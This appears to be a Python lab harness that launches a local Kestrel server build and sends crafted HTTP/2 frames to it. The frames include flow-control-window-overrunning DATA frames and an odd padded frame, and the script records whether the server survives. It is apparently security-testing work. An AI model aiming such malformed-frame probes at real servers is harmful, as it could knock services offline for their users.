import json
import os
import subprocess
import time
from probe2 import connect, frame, headers, collect, health, describe

def trial(version, mode):
    assembly = os.path.abspath(os.path.join("f043-lab", "bin", "Debug", version, "f043-lab.dll"))
    env = os.environ.copy()
    env["F043_TIGHT"] = "1"
    proc = subprocess.Popen(["dotnet", assembly], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    attack = None
    out = {"version": version, "mode": mode}
    try:
        for _ in range(50):
            if proc.poll() is not None:
                raise RuntimeError("server exited at startup")
            try:
                initial = health()
                if initial:
                    break
            except Exception:
                time.sleep(0.1)
        else:
            raise RuntimeError("server failed to become healthy")
        out["runtime"] = initial["runtime"]
        out["kestrelAssembly"] = initial["kestrelAssembly"]
        attack = connect()
        for sid in (1, 3):
            attack.sendall(frame(1, 4, sid, headers("/hold", "POST")))
        if mode == "prepad":
            attack.sendall(frame(0, 8, 1, b"\xff" + b"\x00" * 255))
        out["beforeData"] = describe(collect(attack, 0.15))
        lengths = (32767, 32768) if mode == "valid" else (32768, 32768)
        for sid, length in zip((1, 3), lengths):
            left = length
            while left:
                n = min(left, 16384)
                attack.sendall(frame(0, 0, sid, b"x" * n))
                left -= n
        out["sentData"] = sum(lengths)
        out["afterData"] = describe(collect(attack, 0.7))
        out["secondClient"] = health()
        out["alive"] = proc.poll() is None
    except Exception as e:
        out["error"] = type(e).__name__ + ": " + str(e)
    finally:
        if attack:
            attack.close()
        proc.terminate()
        try:
            _, err = proc.communicate(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            _, err = proc.communicate(timeout=3)
        out["serverLogTail"] = err.decode(errors="replace")[-1800:]
    return out

for version in ("net10.0", "net11.0"):
    for mode in ("valid", "no_pad", "prepad"):
        print(json.dumps(trial(version, mode)), flush=True)
print(json.dumps(trial("net10.0", "prepad")), flush=True)
print("F043_ONE_BYTE_BOUNDARY_COMPLETE", flush=True)
